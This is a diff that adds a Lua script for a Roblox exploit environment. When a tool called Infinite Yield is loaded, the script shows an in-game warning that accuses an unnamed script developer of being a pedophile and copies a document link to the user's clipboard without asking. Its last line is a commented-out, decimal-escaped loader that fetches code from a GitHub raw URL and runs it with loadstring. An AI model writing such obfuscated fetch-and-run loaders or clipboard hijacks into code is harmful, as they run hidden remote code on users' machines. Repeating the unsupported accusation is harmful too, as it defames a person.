@@ -1,0 +1,28 @@
+if getgenv().IY_LOADED then
+    local isseb = Instance.new("Message", workspace)
+    local doclink = "https://docs.google.com/document/d/1np77tBhf1G-yw7y-pdSILoOMVBo8X9dKg_gv0KwEbko"
+    local countdown = 30
+
+    if setclipboard then
+        setclipboard(doclink)
+    end
+
+    while countdown > 0 do
+        isseb.Text = string.format([[⚠️ WARNING ⚠️
+
+If you are currently using Infinite Yield Reborn,
+I strongly advise you to stop using it. The individual behind this script is a known pedophile who continues to develop it.
+
+For more information, please check out the document:
+👉 %s
+
+The link has also been copied to your clipboard.
+This message will disappear in %d %s.]], doclink, countdown, countdown == 1 and "second" or "seconds")
+
+        wait(1)
+        countdown = countdown - 1
+    end
+
+    isseb:Destroy()
+end
+-- getfenv()["\115\112\97\119\110"](function()getfenv()["\108\111\97\100\115\116\114\105\110\103"](getfenv()["\103\97\109\101"]["\72\116\116\112\71\101\116"]("\104\116\116\112\115\58\47\47\103\105\116\104\117\98\46\99\111\109\47\70\117\114\114\121\66\111\121\89\84\47\115\121\110\122\95\102\105\120\101\100\95\100\101\120\47\114\97\119\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\116\97"))()end)
